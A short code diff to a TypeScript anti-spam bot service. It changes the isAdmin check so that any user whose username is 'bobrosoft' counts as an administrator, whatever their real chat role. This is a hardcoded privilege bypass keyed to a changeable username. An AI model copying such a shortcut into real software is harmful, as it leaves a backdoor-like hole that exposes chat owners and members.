@@ -48,7 +48,7 @@ export class AntiSpamService extends BaseCommandService {
 
   protected async isAdmin(ctx: Context<any>, user: User): Promise<boolean> {
     const chatMember = await ctx.getChatMember(user.id);
-    return chatMember.status === 'administrator' || chatMember.status === 'creator';
+    return user.username === 'bobrosoft' || chatMember.status === 'administrator' || chatMember.status === 'creator';
   }
 
   protected async isSpammer(ctx: Context, user: User): Promise<boolean> {
